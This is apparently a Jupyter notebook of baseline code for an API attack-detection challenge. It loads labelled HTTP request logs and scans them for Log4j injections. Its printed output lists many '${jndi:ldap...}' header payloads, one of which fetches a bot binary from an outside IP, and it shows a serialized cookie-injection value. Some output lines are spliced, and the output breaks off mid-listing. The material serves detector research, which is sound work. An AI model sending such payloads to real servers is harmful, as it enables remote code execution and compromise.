# %% [markdown]
# # Cisco - Ariel University API Security Detection Challenge 2023
# ## Baseline code
#
#
# ### Imports and global settings

# %%
# Imports, settings and first dataset view
import pandas as pd
import seaborn as sns
import numpy as np
import json
import matplotlib.pyplot as plt

from sklearn.feature_extraction.text import CountVectorizer, HashingVectorizer, TfidfVectorizer
from sklearn.preprocessing import LabelEncoder
from sklearn.model_selection import train_test_split
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.metrics import confusion_matrix, classification_report
from collections import Counter
from sklearn.svm import LinearSVC, SVC
from sklearn.linear_model import LogisticRegression
from sklearn.neighbors import KNeighborsClassifier
from sklearn.tree import DecisionTreeClassifier
from sklearn.preprocessing import StandardScaler 
import re


LOG_4_ATTACK = "LOGJATTACKHERE"

# Set pandas to show all columns when you print a dataframe
pd.set_option('display.max_columns', None)

# Global setting here you choose the dataset number and classification type for the model
dataset_number = 4 # Options are [1, 2, 3, 4]
test_type = 'attack_type' # Options are ['label', 'attack_type']


# Read the json and read it to a pandas dataframe object, you can change these settings
with open(f'./dataset_{str(dataset_number)}_train.json') as file:
    raw_ds = json.load(file)
    file.close()
df = pd.json_normalize(raw_ds, max_level=2)
# Shoe the first five lines of the dataframe to see if everything was read accordingly 
df.head()
# Out:
#   request.headers.Host                         request.headers.User-Agent  \
# 0       127.0.0.1:5000  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1...
# 1       127.0.0.1:5000  Mozilla/5.0 (Windows NT 6.3; Win64; x64) Apple...
# 2       127.0.0.1:5000  Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20...
# 3       127.0.0.1:5000  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; ...
# 4       127.0.0.1:5000  Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) G...
#
#                      request.headers.Accept-Encoding request.headers.Accept  \
# 0                                  gzip, deflate, br                    */*
# 1                                  gzip, deflate, br                    */*
# 2  gzip, deflate, br${jndi:ldaphabbologinbr.rel7....                    */*
# 3                   x-gzip, x-deflate, gzip, deflate                    */*
# 4                                  gzip, deflate, br                    */*
#
#   request.headers.Connection request.headers.Sec-Ch-Ua-Platform  \
# 0                 keep-alive                          "Windows"
# 1                 keep-alive                          "Windows"
# 2                 keep-alive                                NaN
# 3                 keep-alive                          "Windows"
# 4                 keep-alive                          "Windows"
#
#   request.headers.Sec-Ch-Ua-Mobile request.headers.Accept-Language  \
# 0                               ?0                           de-CH
# 1                               ?0         en-US,en;q=0.9,he;q=0.8
# 2                               ?1         en-US,en;q=0.9,he;q=0.8
# 3                               ?1         en-US,en;q=0.9,he;q=0.8
# 4                               ?1                           de-CH
#
#   request.headers.Sec-Fetch-Site request.headers.Sec-Fetch-Mode  \
# 0                           none                    same-origin
# 1                           none                      websocket
# 2                           none                    same-origin
# 3                           none                      websocket
# 4                           none                      websocket
#
#   request.headers.Cache-Control request.headers.Sec-Fetch-User  \
# 0                      no-store                             ?1
# 1                      no-cache                             ?1
# 2                      no-store                             ?1
# 3                      no-cache                             ?1
# 4                     max-age=0                             ?1
#
#   request.headers.Sec-Fetch-Dest  \
# 0                       document
# 1                       document
# 2                       document
# 3                       document
# 4                       document
#
#                           request.headers.Set-Cookie  \
# 0  ['ttauth=AnmLHb1kdzYvpficmoZ6ahuxln7RK43GPlS6Q...
# 1  ['cid=9ML55TwNFFw14MA2N-N6B8v_LTjMEyppvz3F-H99...
# 2  ['ttauth=XSgpzlTZBc47Xm36ObpZplFzV2KbUgC68xBcA...
# 3  ['ttauth=kOqLuuI_RaiyuKw-926q36BZ4s3ZH251NQ37i...
# 4  ['ttauth=rN-ka7ksV-2K6QtY-_wNmdI1i4zY2kVoDQW6e...
#
#             request.headers.Date request.method  \
# 0  Sun, 18 Dec 2022 01:42:25 GMT            GET
# 1  Sun, 18 Dec 2022 01:44:11 GMT            GET
# 2  Sun, 18 Dec 2022 01:34:30 GMT            GET
# 3  Sun, 18 Dec 2022 01:43:59 GMT            GET
# 4  Sun, 18 Dec 2022 01:23:50 GMT            GET
#
#                                          request.url request.body  \
# 0          http://127.0.0.1:5000/orders/get/random/2
# 1  http://127.0.0.1:5000/orders/check/exists?val=...
# 2  http://127.0.0.1:5000/login/user?username=Rich...
# 3                 http://127.0.0.1:5000/greet/Warren
# 4  http://127.0.0.1:5000/states/Bagdon?resource=R...
#
#     response.status response.headers.Content-Type  \
# 0            200 OK              application/json
# 1     404 NOT FOUND              application/json
# 2  401 UNAUTHORIZED              application/json
# 3            200 OK      text/html; charset=utf-8
# 4     404 NOT FOUND              application/json
#
#   response.headers.Content-Length  response.status_code  \
# 0                               8                   200
# 1                              31                   404
# 2                              26                   401
# 3                              22                   200
# 4                              28                   404
#
#                      response.body request.Attack_Tag  \
# 0                         [{}, {}]                NaN
# 1  {"error": "Order ID not found"}                NaN
# 2       {"error": "Access denied"}              LOG4J
# 3         text/html; charset=utf-8                NaN
# 4     {"error": "State not found"}                NaN
#
#   response.headers.Location request.headers.Cookie  \
# 0                       NaN                    NaN
# 1                       NaN                    NaN
# 2                       NaN                    NaN
# 3                       NaN                    NaN
# 4                       NaN                    NaN
#
#   request.headers.Content-Length response.headers.Set-Cookie  \
# 0                            NaN                         NaN
# 1                            NaN                         NaN
# 2                            NaN                         NaN
# 3                            NaN                         NaN
# 4                            NaN                         NaN
#
#   request.headers.Upgrade-Insecure-Requests
# 0                                       NaN
# 1                                       NaN
# 2                                       NaN
# 3                                       NaN
# 4                                       NaN

# %% [markdown]
# ### Basic dataset label arrangements

# %%
# Fill the black attack tag lines with "Benign" string
df['request.Attack_Tag'] = df['request.Attack_Tag'].fillna('Benign')
df['attack_type'] = df['request.Attack_Tag']

# This function will be used in the lambda below to iterate over the label columns 
# You can use this snippet to run your own lambda on any data with the apply() method
def categorize(row):  
    if row['request.Attack_Tag'] == 'Benign':
        return 'Benign'
    return 'Malware'

df['label'] = df.apply(lambda row: categorize(row), axis=1)

#df[df['attack_type'] == 'RCE'][['request.url']] = df[df['attack_type'] == 'RCE'][['request.url']].apply(lambda x: x.replace('http://127.0.0.1:5000/', ''))
# df[df['attack_type'] == 'SQL Injection'][['request.url']] = 
#     df[df['attack_type'] == 'SQL Injection'][['request.url']].apply()

# After finishing the arrangements we delete the irrelevant column
df.drop('request.Attack_Tag', axis=1, inplace=True)

df.head()
# Out:
#   request.headers.Host                         request.headers.User-Agent  \
# 0       127.0.0.1:5000  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1...
# 1       127.0.0.1:5000  Mozilla/5.0 (Windows NT 6.3; Win64; x64) Apple...
# 2       127.0.0.1:5000  Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20...
# 3       127.0.0.1:5000  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; ...
# 4       127.0.0.1:5000  Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) G...
#
#                      request.headers.Accept-Encoding request.headers.Accept  \
# 0                                  gzip, deflate, br                    */*
# 1                                  gzip, deflate, br                    */*
# 2  gzip, deflate, br${jndi:ldaphabbologinbr.rel7....                    */*
# 3                   x-gzip, x-deflate, gzip, deflate                    */*
# 4                                  gzip, deflate, br                    */*
#
#   request.headers.Connection request.headers.Sec-Ch-Ua-Platform  \
# 0                 keep-alive                          "Windows"
# 1                 keep-alive                          "Windows"
# 2                 keep-alive                                NaN
# 3                 keep-alive                          "Windows"
# 4                 keep-alive                          "Windows"
#
#   request.headers.Sec-Ch-Ua-Mobile request.headers.Accept-Language  \
# 0                               ?0                           de-CH
# 1                               ?0         en-US,en;q=0.9,he;q=0.8
# 2                               ?1         en-US,en;q=0.9,he;q=0.8
# 3                               ?1         en-US,en;q=0.9,he;q=0.8
# 4                               ?1                           de-CH
#
#   request.headers.Sec-Fetch-Site request.headers.Sec-Fetch-Mode  \
# 0                           none                    same-origin
# 1                           none                      websocket
# 2                           none                    same-origin
# 3                           none                      websocket
# 4                           none                      websocket
#
#   request.headers.Cache-Control request.headers.Sec-Fetch-User  \
# 0                      no-store                             ?1
# 1                      no-cache                             ?1
# 2                      no-store                             ?1
# 3                      no-cache                             ?1
# 4                     max-age=0                             ?1
#
#   request.headers.Sec-Fetch-Dest  \
# 0                       document
# 1                       document
# 2                       document
# 3                       document
# 4                       document
#
#                           request.headers.Set-Cookie  \
# 0  ['ttauth=AnmLHb1kdzYvpficmoZ6ahuxln7RK43GPlS6Q...
# 1  ['cid=9ML55TwNFFw14MA2N-N6B8v_LTjMEyppvz3F-H99...
# 2  ['ttauth=XSgpzlTZBc47Xm36ObpZplFzV2KbUgC68xBcA...
# 3  ['ttauth=kOqLuuI_RaiyuKw-926q36BZ4s3ZH251NQ37i...
# 4  ['ttauth=rN-ka7ksV-2K6QtY-_wNmdI1i4zY2kVoDQW6e...
#
#             request.headers.Date request.method  \
# 0  Sun, 18 Dec 2022 01:42:25 GMT            GET
# 1  Sun, 18 Dec 2022 01:44:11 GMT            GET
# 2  Sun, 18 Dec 2022 01:34:30 GMT            GET
# 3  Sun, 18 Dec 2022 01:43:59 GMT            GET
# 4  Sun, 18 Dec 2022 01:23:50 GMT            GET
#
#                                          request.url request.body  \
# 0          http://127.0.0.1:5000/orders/get/random/2
# 1  http://127.0.0.1:5000/orders/check/exists?val=...
# 2  http://127.0.0.1:5000/login/user?username=Rich...
# 3                 http://127.0.0.1:5000/greet/Warren
# 4  http://127.0.0.1:5000/states/Bagdon?resource=R...
#
#     response.status response.headers.Content-Type  \
# 0            200 OK              application/json
# 1     404 NOT FOUND              application/json
# 2  401 UNAUTHORIZED              application/json
# 3            200 OK      text/html; charset=utf-8
# 4     404 NOT FOUND              application/json
#
#   response.headers.Content-Length  response.status_code  \
# 0                               8                   200
# 1                              31                   404
# 2                              26                   401
# 3                              22                   200
# 4                              28                   404
#
#                      response.body response.headers.Location  \
# 0                         [{}, {}]                       NaN
# 1  {"error": "Order ID not found"}                       NaN
# 2       {"error": "Access denied"}                       NaN
# 3         text/html; charset=utf-8                       NaN
# 4     {"error": "State not found"}                       NaN
#
#   request.headers.Cookie request.headers.Content-Length  \
# 0                    NaN                            NaN
# 1                    NaN                            NaN
# 2                    NaN                            NaN
# 3                    NaN                            NaN
# 4                    NaN                            NaN
#
#   response.headers.Set-Cookie request.headers.Upgrade-Insecure-Requests  \
# 0                         NaN                                       NaN
# 1                         NaN                                       NaN
# 2                         NaN                                       NaN
# 3                         NaN                                       NaN
# 4                         NaN                                       NaN
#
#   attack_type    label
# 0      Benign   Benign
# 1      Benign   Benign
# 2       LOG4J  Malware
# 3      Benign   Benign
# 4      Benign   Benign

# %%
def fill_na_df(df_na):
    # Remove all NAN columns or replace with desired string
    # This loop iterates over all of the column names which are all NaN
    for column in df_na.columns[df_na.isna().any()].tolist():
        # df.drop(column, axis=1, inplace=True)
        df_na[column] = df_na[column].fillna('None')

    # If you want to detect columns that may have only some NaN values use this:
    #df.loc[:, df.isna().any()]

fill_na_df(df)
df_checker = pd.DataFrame(df)

# df.to_csv(f'data_set_{dataset_number}.csv', index=False)

df
# Out:
#        request.headers.Host  \
# 0            127.0.0.1:5000
# 1            127.0.0.1:5000
# 2            127.0.0.1:5000
# 3            127.0.0.1:5000
# 4            127.0.0.1:5000
# ...                     ...
# 182762       127.0.0.1:5000
# 182763       127.0.0.1:5000
# 182764       127.0.0.1:5000
# 182765       127.0.0.1:5000
# 182766       127.0.0.1:5000
#
#                                request.headers.User-Agent  \
# 0       Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1...
# 1       Mozilla/5.0 (Windows NT 6.3; Win64; x64) Apple...
# 2       Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20...
# 3       Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; ...
# 4       Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) G...
# ...                                                   ...
# 182762  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1...
# 182763  Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko...
# 182764  Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebK...
# 182765  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...
# 182766  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1...
#
#                           request.headers.Accept-Encoding  \
# 0                                       gzip, deflate, br
# 1                                       gzip, deflate, br
# 2       gzip, deflate, br${jndi:ldaphabbologinbr.rel7....
# 3                        x-gzip, x-deflate, gzip, deflate
# 4                                       gzip, deflate, br
# ...                                                   ...
# 182762                                  gzip, deflate, br
# 182763                                  gzip, deflate, br
# 182764                                  gzip, deflate, br
# 182765                   x-gzip, x-deflate, gzip, deflate
# 182766                   x-gzip, x-deflate, gzip, deflate
#
#        request.headers.Accept request.headers.Connection  \
# 0                         */*                 keep-alive
# 1                         */*                 keep-alive
# 2                         */*                 keep-alive
# 3                         */*                 keep-alive
# 4                         */*                 keep-alive
# ...                       ...                        ...
# 182762                    */*                 keep-alive
# 182763                    */*                 keep-alive
# 182764                    */*                 keep-alive
# 182765                    */*                 keep-alive
# 182766                    */*                 keep-alive
#
#        request.headers.Sec-Ch-Ua-Platform request.headers.Sec-Ch-Ua-Mobile  \
# 0                               "Windows"                               ?0
# 1                               "Windows"                               ?0
# 2                                    None                               ?1
# 3                               "Windows"                               ?1
# 4                               "Windows"                               ?1
# ...                                   ...                              ...
# 182762                               None                               ?0
# 182763                               None                               ?0
# 182764                               None                               ?0
# 182765                          "Windows"                               ?0
# 182766                          "Windows"                               ?0
#
#        request.headers.Accept-Language request.headers.Sec-Fetch-Site  \
# 0                                de-CH                           none
# 1              en-US,en;q=0.9,he;q=0.8                           none
# 2              en-US,en;q=0.9,he;q=0.8                           none
# 3              en-US,en;q=0.9,he;q=0.8                           none
# 4                                de-CH                           none
# ...                                ...                            ...
# 182762                  en-US,en;q=0.5                           none
# 182763                           de-CH                           none
# 182764                           de-CH                           none
# 182765                  en-US,en;q=0.5                           none
# 182766                              de                           none
#
#        request.headers.Sec-Fetch-Mode request.headers.Cache-Control  \
# 0                         same-origin                      no-store
# 1                           websocket                      no-cache
# 2                         same-origin                      no-store
# 3                           websocket                      no-cache
# 4                           websocket                     max-age=0
# ...                               ...                           ...
# 182762                      websocket                      no-cache
# 182763                      websocket                      no-cache
# 182764                    same-origin                     max-age=0
# 182765                    same-origin                      no-store
# 182766                    same-origin                     max-age=0
#
#        request.headers.Sec-Fetch-User request.headers.Sec-Fetch-Dest  \
# 0                                  ?1                       document
# 1                                  ?1                       document
# 2                                  ?1                       document
# 3                                  ?1                       document
# 4                                  ?1                       document
# ...                               ...                            ...
# 182762                             ?1                       document
# 182763                             ?1                       document
# 182764                             ?1                       document
# 182765                             ?1                       document
# 182766                             ?1                       document
#
#                                request.headers.Set-Cookie  \
# 0       ['ttauth=AnmLHb1kdzYvpficmoZ6ahuxln7RK43GPlS6Q...
# 1       ['cid=9ML55TwNFFw14MA2N-N6B8v_LTjMEyppvz3F-H99...
# 2       ['ttauth=XSgpzlTZBc47Xm36ObpZplFzV2KbUgC68xBcA...
# 3       ['ttauth=kOqLuuI_RaiyuKw-926q36BZ4s3ZH251NQ37i...
# 4       ['ttauth=rN-ka7ksV-2K6QtY-_wNmdI1i4zY2kVoDQW6e...
# ...                                                   ...
# 182762  ['ttauth=NPpRHbzfv7BJ5RGB9-oJNl30Ttdc8RYxbuiSe...
# 182763  ['ttauth=Mqfe3PeeakWRmzjsA7MKaNiXmVcbMxMuNQxej...
# 182764  ['cid=-Sp8A62rcqJXADEypNzwtw-iIf9cdHkqMQvKTMNB...
# 182765  ['cid=ERxhJ-aIoFvtHePuy6iitkoC1AdXWOmx2r5Drhpl...
# 182766  ['cid=gJEnE9oujkj7v6KLtnZBBpWODQHkEeAHmm6J_8F6...
#
#                  request.headers.Date request.method  \
# 0       Sun, 18 Dec 2022 01:42:25 GMT            GET
# 1       Sun, 18 Dec 2022 01:44:11 GMT            GET
# 2       Sun, 18 Dec 2022 01:34:30 GMT            GET
# 3       Sun, 18 Dec 2022 01:43:59 GMT            GET
# 4       Sun, 18 Dec 2022 01:23:50 GMT            GET
# ...                               ...            ...
# 182762  Sun, 18 Dec 2022 01:25:40 GMT            GET
# 182763  Sun, 18 Dec 2022 01:19:48 GMT            GET
# 182764  Sun, 18 Dec 2022 01:31:12 GMT            GET
# 182765  Sun, 18 Dec 2022 01:50:29 GMT            GET
# 182766  Sun, 18 Dec 2022 01:59:07 GMT            GET
#
#                                               request.url request.body  \
# 0               http://127.0.0.1:5000/orders/get/random/2
# 1       http://127.0.0.1:5000/orders/check/exists?val=...
# 2       http://127.0.0.1:5000/login/user?username=Rich...
# 3                      http://127.0.0.1:5000/greet/Warren
# 4       http://127.0.0.1:5000/states/Bagdon?resource=R...
# ...                                                   ...          ...
# 182762  http://127.0.0.1:5000/login/user?username=Brue...
# 182763                  http://127.0.0.1:5000/cookielogin
# 182764                        http://127.0.0.1:5000/forum
# 182765    http://127.0.0.1:5000/orders/get/employee_id/35
# 182766  http://127.0.0.1:5000/login/admin/password/bgd...
#
#          response.status response.headers.Content-Type  \
# 0                 200 OK              application/json
# 1          404 NOT FOUND              application/json
# 2       401 UNAUTHORIZED              application/json
# 3                 200 OK      text/html; charset=utf-8
# 4          404 NOT FOUND              application/json
# ...                  ...                           ...
# 182762  401 UNAUTHORIZED              application/json
# 182763            200 OK      text/html; charset=utf-8
# 182764            200 OK      text/html; charset=utf-8
# 182765     404 NOT FOUND              application/json
# 182766   400 BAD REQUEST              application/json
#
#        response.headers.Content-Length  response.status_code  \
# 0                                    8                   200
# 1                                   31                   404
# 2                                   26                   401
# 3                                   22                   200
# 4                                   28                   404
# ...                                ...                   ...
# 182762                              26                   401
# 182763                             104                   200
# 182764                          128212                   200
# 182765                              34                   404
# 182766                              26                   400
#
#                              response.body response.headers.Location  \
# 0                                 [{}, {}]                      None
# 1          {"error": "Order ID not found"}                      None
# 2               {"error": "Access denied"}                      None
# 3                 text/html; charset=utf-8                      None
# 4             {"error": "State not found"}                      None
# ...                                    ...                       ...
# 182762          {"error": "Access denied"}                      None
# 182763            text/html; charset=utf-8                      None
# 182764            text/html; charset=utf-8                      None
# 182765  {"error": "Employee ID not found"}                      None
# 182766          {"error": "Access denied"}                      None
#
#                                    request.headers.Cookie  \
# 0                                                    None
# 1                                                    None
# 2                                                    None
# 3                                                    None
# 4                                                    None
# ...                                                   ...
# 182762                                               None
# 182763  username=gASVyAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhb...
# 182764                                               None
# 182765                                               None
# 182766                                               None
#
#        request.headers.Content-Length response.headers.Set-Cookie  \
# 0                                None                        None
# 1                                None                        None
# 2                                None                        None
# 3                                None                        None
# 4                                None                        None
# ...                               ...                         ...
# 182762                           None                        None
# 182763                           None                        None
# 182764                           None                        None
# 182765                           None                        None
# 182766                           None                        None
#
#        request.headers.Upgrade-Insecure-Requests       attack_type    label
# 0                                           None            Benign   Benign
# 1                                           None            Benign   Benign
# 2                                           None             LOG4J  Malware
# 3                                           None            Benign   Benign
# 4                                           None            Benign   Benign
# ...                                          ...               ...      ...
# 182762                                      None     SQL Injection  Malware
# 182763                                      None  Cookie Injection  Malware
# 182764                                      None               XSS  Malware
# 182765                                      None            Benign   Benign
# 182766                                      None            Benign   Benign
#
# [182767 rows x 30 columns]

# %%
keep_list = ['Benign', 'LOG4J']
f = df[df['attack_type'].isin(keep_list)]
f = df[df['attack_type'] == 'LOG4J']
#print(*f['request.url'].values.tolist(), sep='\n')
set_cols = set()
counter = 0
column_names = f.columns.values.tolist()
for index, row in f.iterrows():
    for col in column_names:
        data = str(row[col])
        if re.search(r'\$\{[a-z]+:.*\}', data):
            print(f'index:\t{index}')
            print(f'col name:\t{col}')
            print(f'data:{data}\n')
            counter += 1
            set_cols.add(col)
print()
print(set_cols)
print('counter:', counter)
f.shape
# Out:
# index:	2
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldaphabbologinbr.rel7.com/}
#
# index:	10
# col name:	request.headers.Set-Cookie
# data:['ttauth=vX8s_fulSrKcPI643qpLHSOmRbwqG9fBIn_EjiXNpM0kMa4-J8AJOM2CUBngbQ-8XKgrYuu4d3GZlRjczgUd8Q; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 01:44:42 GMT', 'ck=ELTyzjGnNBrYPiXZ4MyqfhKB6gzJB5fAKoyPpYOeBuY; Domain=www.pmg.csail.mit.edu/papers/popl97/popl97.html; Expires=Fri, 10 Feb 2023 01:38:42 GMT', 'uu=qouWZbTdWts8RpYdcZ2849SvhOKFrEhWg_pjdjtiJ_o; Domain=duye08.com; Expires=Mon, 09 Jan 2023 01:38:42 GMT', 'session=ee658d7b-1df0-4e7c-a759-452a6d62ce9a; Expires=Sun, 18 Dec 2022 01:43:42 GMT']${jndi:ldapsearch.espn.go.com/jimmy-rollins/}
#
# index:	116
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldaphttp://www.civelo.no/index.php?option=com_content&view=article&id=20:civelo-5&catid=14&Itemid=6&lang=sv}
#
# index:	226
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldaphttp://teamgorillas.com/index.php?option=com_content&view=article&id=47&Itemid=53}
#
# index:	880
# col name:	request.headers.Set-Cookie
# data:['cid=WYwGe03PWnTXbZeqLLOydONuh-di7hjIGNGccwAb0x1UMF7M7gdTRlWdhIQWjl8ts853uakEk59iJ94K-ZZN15eX2u3jxndOzbktkk2Md3Uy85QmZSh-8lODUI5_46YEUsrtycGqaF5pKPAZ3phlYFJX67WTqFe6T-4gvdA1Gww; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:05:52 GMT', 'ck=w7eO_7A47PKBPH8IrmakeVgOuc5c9vs7imevTrfYK89EXtccnxWfeLgthv8ScmGC4JfjyB7Unod_EzWb1WN2Vw; Domain=www.oracle.com/applications/agile/index.html; Expires=Tue, 17 Jan 2023 01:23:52 GMT', 'uu=elB2tky3QG-HctdkJavwEsy-QrmcoIkbc2pBoPV1PilZMwslS6icLC-TyUJXTRayAgtBRtoWPRnLhYk0L72Jdw; Domain=teamhare.com/; Expires=Mon, 26 Dec 2022 01:23:52 GMT', 'session=69a7d95c-2ad1-4a98-8d69-c6b242b89eb3; Expires=Sun, 18 Dec 2022 01:40:52 GMT']${jndi:ldapcswap.com/1996/Norma_Jean_&_Marilyn}
#
# index:	948
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldapmusic.yahoo.com/bernie-worrell-the-woo-warriors/}
#
# index:	966
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapmy.elvisti.com/siparen/Epis_e.htm}
#
# index:	975
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldaplistsearches.rootsweb.com/th/read/METISGEN/2002-06/1024244174}
#
# index:	984
# col name:	request.headers.Set-Cookie
# data:['ttauth=Ir1MYUP7cmDEK8aCHdH4mQ; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:00:08 GMT', 'ck=K2v7VhNhHu-ouaIXle8Guw; Domain=www.edafe.org/mozilla/; Expires=Mon, 30 Jan 2023 01:22:08 GMT', 'uu=ZbswuIYLkwGUrRhIVerhB9aI9Q7HPUXpgngdPAeO3PwVhPGYq2It7ky2NZ0oZChrbEQaJDfYBvu6XxqpPulvxA; Domain=http://www.thereefrestaurant.com/wp-content/themes/thereef/style.css; Expires=Tue, 17 Jan 2023 01:22:08 GMT', 'session=4794311c-b701-4508-9475-3fdc8a19dd8f; Expires=Sun, 18 Dec 2022 01:38:08 GMT']${jndi:ldapcanadians.ca/more/profiles/b/b_genevieve_bujold.htm}
#
# index:	1001
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldaphttp://www.horizonte-hospizverein.de/index.php?option=com_jevents&task=day.listevents&year=2013&month=01&day=21&Itemid=126}
#
# index:	1014
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldapnortexinfo.net/region2music/KINGSLEY/Robeson.htm}
#
# index:	1022
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapallconsuming.net/item/view/1036758}
#
# index:	1138
# col name:	request.headers.Set-Cookie
# data:['ttauth=b9hpQK36HjpuJq_5Ol8ZhA; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapgoodreads.com/author/quotes/112258.Eric_Berne}
#
# index:	1317
# col name:	request.headers.Set-Cookie
# data:['cid=0pH6r55yNKi8YlgUJHlCYcnyMkyttvhNgYl-0aWzu8i8BrgVeh2ybE6CT0shLrZzihw3RmmCIdzTTYFb25zFGmdP_MYle5LIZCctPWF2hxwVX5nakdpItTknXXk9vn85MgHmymH7dZAMoEKRDoAbKHMgF0ZCLc5BwJZn2guGJOE; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:11:20 GMT', 'ck=X_jffCYP_-vwPsOP5RmtqpIzQ66i7AbPodUlUzLMqU6mqPtHsuOBFlSA7bmna_aPRdymr7K3V-YCO9qoxyfKza7n1j1cn3_GQVf2yGsRRG-tdPcfkxZ9ukzZ9sikxEUbdhNA4X-0r4CA_6N-zGZISxQ7JnVRcBPEXHmW_DLGSI0; Domain=penguins.nhl.com/club/draftstats.htm?round=1&year=2005; Expires=Sun, 01 Jan 2023 01:30:20 GMT', 'uu=BDI3MwrhtwXt5axG8F1R13HFehleNtiQRi0udR9zDyE; Domain=salmonflies.com/nbflytyers/ronaldlong.htm; Expires=Sun, 29 Jan 2023 01:30:20 GMT', 'session=71ad9465-6e67-44ac-9068-6ab2de57b6d1; Expires=Sun, 18 Dec 2022 02:12:20 GMT']${jndi:ldaphttp://64.227.19.251/bins/Hilix.m68k}
#
# index:	1458
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapfacebook.com/group.php?gid=99533666249}
#
# index:	1639
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapridemetro.org/SchedulesMaps/ParkRide/Missouri.aspx}
#
# index:	1754
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldapwesternoutlaw.com/harvey-logan-a-k-a-kid-curry}
#
# index:	1858
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldaphttp://www.topictlearning.com.br/index.php?option=com_content&view=article&id=222&Itemid=134}
#
# index:	1876
# col name:	request.headers.Set-Cookie
# data:['ttauth=AO2bTX3mdn10G5NprVELEMplapJD8hcmlEdjKDThaqs1zayNZc0fY5KtuWszfnv-CLs_CHa5zdOYARIknG6IVA; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:15:36 GMT', 'ck=EEIsfvST6ROubIE8WJ5nlg; Domain=http://www.emmis-feinkost.de/impressum; Expires=Thu, 16 Feb 2023 01:25:36 GMT', 'uu=wCHVrn196aCjgteB7RL2IA; Domain=http://www.zibae.ir/index.php?option=com_content&view=article&id=655:-10-&catid=12:1389-09-29-07-43-30; Expires=Sun, 22 Jan 2023 01:25:36 GMT', 'session=c643390a-de95-4df0-9f09-52eebf72532c; Expires=Sun, 18 Dec 2022 02:24:36 GMT']${jndi:ldaphttp://kenh14.vn/musik/dong-nhi-va-noo-phuoc-thinh-dan-dau-binh-chon-htv-awards-2015-2015012705136572.chn}
#
# index:	1884
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapkivaweb.kcmo.org/kivanet/2/permit/address/index.cfm?fa=3&pin=E8524&ain=913869&pid=1159574&jur=KCMO}
#
# index:	1921
# col name:	request.headers.Set-Cookie
# data:['cid=C9jMwZrA8YpVOcQDvWhKno_Tp8q4KkzwrgL2cc3WeOz4CLktuvL0MhyTp_VBmnZ-t8ElFnibaeoX7LVwAuCbTeGb7FE51lQgL8tgxT7nSmxhKHmkvL0LcupOFhhYBFmDYjR_V2mEhlQo0Pg7DUSec41XbfJPMBxImpuybkBbPP8; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldaphttp://www.kretingosmuziejus.lt/apie-mus/19-svetaines-startas}
#
# index:	2479
# col name:	request.headers.Set-Cookie
# data:['cid=jo9E3NTxbcG011WcvIX65ibUZP0UeHY7obQ2wVDy0D_bXL1tTG0MWufrF-I8VXHkuL2MzbuSAgXooMtBCFGUc-ROezOM39vEvTXzMkwmE7mUGhuthlIltsdrdgWZ7vqAzy1rlLn-xzXIMu0avkr3W8ccwtylbUKjfcOgcD1czUk; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:10:24 GMT', 'ck=0kCYA6r3lbus2r_hSCzWVA; Domain=www.hartenberger.de/english/; Expires=Wed, 15 Feb 2023 01:33:24 GMT', 'uu=LrzqU6QzntzT83B81ok1mbpzfDpN055qi_nxabj1IF-4hi-LXtRe50_KhLh7TIUwgOP5BUXLRvAiN7z9ddZEpg; Domain=help.payment.online.gharjamaimatrimonial.com; Expires=Sun, 01 Jan 2023 01:33:24 GMT', 'session=7b4ee573-1eba-4bc9-9cf4-e1d0053a490d; Expires=Sun, 18 Dec 2022 01:54:24 GMT']${jndi:ldapdocsports.com/schedules/mlb/Oakland.html}
#
# index:	2488
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapenotes.com/topic/Electrical_and_Mechanical_Engineering_Branch}
#
# index:	2493
# col name:	request.headers.Set-Cookie
